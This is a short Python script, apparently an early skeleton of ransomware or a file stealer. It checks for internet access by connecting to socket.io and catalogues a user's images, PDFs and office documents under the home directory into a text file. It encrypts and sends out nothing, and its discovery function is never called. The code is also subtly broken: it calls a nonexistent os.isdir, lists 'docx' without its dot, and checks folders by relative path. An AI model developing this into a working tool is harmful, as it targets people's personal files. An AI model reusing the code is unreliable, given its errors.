import os
import socket

home = os.environ['HOME']
carpetas = [ x for x in os.listdir(home) if not x.startswith('.') ]
extensiones = ['.jpg', '.pdf','.png', '.xls', '.doc', '.jpeg', 'docx']

def check_internet():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('socket.io', 80))
        s.close()
    except:
        exit()

def discover():
    file_list = open('file_list.txt', 'w+')
    for carpeta in carpetas:
        if os.isdir(carpeta):
            for extension in extensiones:
                for rutabs, directorio, archivo in os.walk(f"{home}/{carpeta}"):
                    for file in archivo:
                        if file.endswith(extension):
                            file_list.write(os.path.join(rutabs, file+"\n"))
    file_list.close()

def main():
    check_internet()
    print(carpetas)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
